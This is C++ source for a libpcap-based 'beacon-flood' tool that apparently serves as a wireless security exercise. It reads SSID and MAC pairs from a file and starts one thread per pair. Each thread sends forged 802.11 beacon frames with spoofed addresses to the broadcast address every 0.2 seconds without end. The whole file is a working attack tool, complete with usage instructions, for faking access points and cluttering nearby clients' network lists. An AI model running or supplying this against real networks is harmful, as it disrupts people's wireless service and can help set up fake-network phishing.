#include "stdafx.h"
#include "dot11.h"

struct AdditionalRadioTap
{
    u_int8_t datarate_;
    u_int8_t pad_;
    u_int16_t txflags_;
};

struct EssidTag
{
    u_int8_t tagnum_;
    u_int8_t taglen_;
    char* data_;
};

#ifndef BEACONFLOOD_LEN
#define BEACONFLOOD_LEN RADIOTAPHDR_LEN+0x4+DOT11BEACONFRAME_LEN+DOT11WIRELESSMANFIXED_LEN+0x2
#endif

void initBeaconPacket(pcap_t* handle, std::string essid, std::string mac) {
    int res = 0;
    int essidlen = essid.length();
    u_char* attackpk = new u_char[BEACONFLOOD_LEN + essidlen];
    //BeaconFlood attackpk;
    Dot11RadioTapHdr radiohdr;
    radiohdr.revision_ = 0x00;
    radiohdr.pad_ = 0x00;
    radiohdr.len_ = 0x000c;
    radiohdr.presentflag_ = 0x00008004;
    memcpy(attackpk, &radiohdr, RADIOTAPHDR_LEN);

    AdditionalRadioTap additional;
    additional.datarate_ = 0x02;
    additional.pad_ = 0x00;
    additional.txflags_ = 0x0018;
    memcpy(attackpk+RADIOTAPHDR_LEN, &additional, 4);

    BeaconPacketForm beaconhdr;
    beaconhdr.dot11bf_.framecontrol_ = 0x80;
    beaconhdr.dot11bf_.flags_ = 0x00;
    beaconhdr.dot11bf_.duration_ = 0x0000;
    beaconhdr.dot11bf_.addr1_ = Mac("ff:ff:ff:ff:ff:ff");
    beaconhdr.dot11bf_.addr2_ = Mac(mac);
    beaconhdr.dot11bf_.addr3_ = Mac(mac);
    beaconhdr.dot11bf_.fragseqnum_ = 0x0000;
    beaconhdr.fixedp_.timestamp_ = 0x0000000000000000;
    beaconhdr.fixedp_.beaconinterval_ = 0x6400;
    beaconhdr.fixedp_.capabilitiesinfo_ = 0x0001;
    memcpy(attackpk+RADIOTAPHDR_LEN+0x4, &beaconhdr, DOT11BEACONFRAME_LEN+DOT11WIRELESSMANFIXED_LEN);

    EssidTag essidtag;
    essidtag.tagnum_ = 0x00;
    essidtag.taglen_ = essidlen;
    essidtag.data_ = new char[essidlen];
    memcpy(essidtag.data_, essid.c_str(), essidlen);
    memcpy(attackpk+RADIOTAPHDR_LEN+0x4+DOT11BEACONFRAME_LEN+DOT11WIRELESSMANFIXED_LEN, &essidtag, 2);
    memcpy(attackpk+RADIOTAPHDR_LEN+0x4+DOT11BEACONFRAME_LEN+DOT11WIRELESSMANFIXED_LEN+0x2, essidtag.data_, essidlen);

    int attackpklen = RADIOTAPHDR_LEN+0x4+DOT11BEACONFRAME_LEN+DOT11WIRELESSMANFIXED_LEN+0x2+essidlen;

    while(true) {
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(attackpk), attackpklen);
        std::cout << "Beacon-Flood packet send, wifi name: " << essid << std::endl;
        usleep(200000); //0.2sec
    }
    delete[] attackpk;
}

void usage() {
	printf("syntax : beacon-flood <interface> <ssid-list-file>\n");
	printf("sample : beacon-flood mon0 ssid-list.txt\n");
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        usage();
        return -1;
    }
    std::ifstream file(argv[2]);
    std::string essidandmac;
    std::vector<std::thread> sendingthds;

    char* interface = argv[1];
    std::cout << "selected interface: "<< interface << std::endl;

	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf); //1000
	if (handle == NULL) {
		std::cerr << "pcap_open_live(" << interface << ") return null - " << errbuf << std::endl;
		return -1;
	}

    while(getline(file, essidandmac)) {
        std::stringstream str(essidandmac);
        str.str(essidandmac);

        std::string essid;
        std::string mac;
        str >> essid;
        str >> mac;
        sendingthds.push_back(std::thread(initBeaconPacket, handle, essid, mac));
    }

    std::vector<std::thread>::iterator iter;
    for(iter = sendingthds.begin(); iter != sendingthds.end(); iter++) {
        (*iter).join();
    }

    file.close();
	pcap_close(handle);
}
